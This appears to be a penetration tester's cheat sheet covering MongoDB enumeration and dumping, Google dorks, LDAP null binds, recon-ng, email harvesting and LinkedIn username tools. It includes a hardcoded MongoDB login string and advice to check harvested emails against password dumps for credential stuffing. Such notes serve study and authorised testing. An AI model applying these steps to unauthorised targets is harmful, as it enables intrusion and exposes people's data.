27017/tcp open  mongodb MongoDB 2.6.9 2.6.9

# mongodb-org-shell install guide.
## https://docs.mongodb.com/manual/tutorial/install-mongodb-on-debian/

# nmap enum; By default all the nmap mongo enumerate scripts are used
nmap -sV --script "mongo* and default" -p 27017 <IP>

# monggodb login
mongo <HOST>
mongo <HOST>:<PORT>
mongo <HOST>:<PORT>/<DB>
mongo <database> -u <username> -p '<password>'
mongo mongodb://admin:monkey13@192.168.120.186:27017/

# mongodb commands
show dbs
use <db>
show collections
db.<collection>.find()  #Dump the collection
db.<collection>.count() #Number of records of the collection
db.current.find({"username":"admin"})  #Find in current db the username admin

```

**enum python script**
```python
from pymongo import MongoClient
client = MongoClient(host, port, username=username, password=password)
client.server_info() #Basic info
#If you have admin access you can obtain more info
admin = client.admin
admin_info = admin.command("serverStatus")
cursor = client.list_databases()
for db in cursor:
    print(db)
    print(client[db["name"]].list_collection_names())
#If admin access, you could dump the database also
```

# passive info-gathering
## google hacking
```bash
site:microsoft.com

site:example.com filetype:php
site:example.com -filetype:html  //exclude html

intile:"netbotz appliance" "OK" -filetype:pdf

inurl:"level/show"
# exploit db  https://www.exploit-db.com/google-hacking-database/
```
## LDAP
```bash
# ldap null bind
ldapsearch -x -b "ou=anonymous,dc=challenge01,dc=root-me,dc=org" -H "ldap://challenge01.root-me.org:54013"
```

## netcraft
Determine the operating system and tools used to build a site
https://searchdns.netcraft.com/

* search web by domain
* Site report view

additional info and history about the server, site tech, registration information

## whois enum
```bash
whois  example.com
whois [ip]
```

## recon-ng 
recon-ng is a module-based framework for web-based information gathering. 

Recon-ng displays the results of a module to the terminal but it also stores them in a database. Much of the power of recon-ng lies in feeding the results of one module into another, allowing us to quickly expand the scope of our information gathering.

full-featured reconnaissance framework designed with the goal of providing a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly.

recon-ng wiki, credentials / api key for module
https://github.com/lanmaster53/recon-ng-marketplace/wiki/API-Keys

```bash
git clone https://github.com/lanmaster53/recon-ng.git
cd recon-ng
pip install -r REQUIREMENTS
./recon-ng
./recon-ng -h

marketplace search github //search modules

//for more info about module
marketplace info recon/domains-hosts/google_site_web

marketplace install recon/domains-hosts/google_site_web //install

modules load recon/domains-hosts/google_site_web  //load
info // display details
options set SOURCE megacorpone.com
run
show host //
```

## github

```bash
user:xxx filename:xxx

text:passwd
```

## shadon
https://www.shadon.in/

```bash
hostname:xxx.com port:"22"
```

## Security headers scan

```bash
nc -v $ip 25
telnet $ip 25
nc TARGET-IP 80
```

https://securityheaders.com/

## SSL Certificate Testing

Analyzes server‘s SSL/TLS configuration and compares it against current best practices;

Also identify some SSL/TLS related vulnerabilities, such as Poodle or heartbleed
https://www.ssllabs.com/ssltest/

## Pastebin
a website for storing and sharing text
https://pastebin.com/

## User infor gathering

### Email harvesting

```bash
# simply email 
git clone https://github.com/killswitch-GUI/SimplyEmail.git
./SimplyEmail.py -all -e TARGET-DOMAIN
```
The harvester 
theHarvester, gathers emails, names , subdomains, ips, urls

```bash
-d target domain
-b set datasoure to search
-s use shadon
-g use google dorks
theHarvester -d megacorpone.com -b google
```
### password dumps

Malicious hackers often dump breached credentials on Pastebin or other less reputablewebsites.178 
These password dumps can be extremely valuable for generating wordlists. For example, Kali Linux includes the “rockyou” wordlist generated from a data breach in 2009.179
Checking the email addresses we’ve found during user enumeration against password dumps can turn up passwords we could use in credential stuffing attacks.

## Social Media tools
social-searcher
search engine for social media sites.
https://www.social-searcher.com


scans user's twitter feed and generates a personalized wordlist used for password
https://digi.ninja/projects/twofi.php

linkedin2username
is a script for generating username lists based on LinkedIn data. It requires
valid LinkedIn credentials and depends on a LinkedIn connection to individuals in the target
organization. The script will output usernames in several different formats
https://github.com/initstring/linkedin2username

Info gathering Frameworks
OSINT Framework
https://osintframework.com/

Maltego
https://www.paterva.com/buy/maltego-clients.php

### Leetlinked
+ LinkedIn Recon tool used to gather employees at a company by utilizing search engines like Google and Bing
+ [git leetlinked](https://github.com/Sq00ky/LeetLinked)
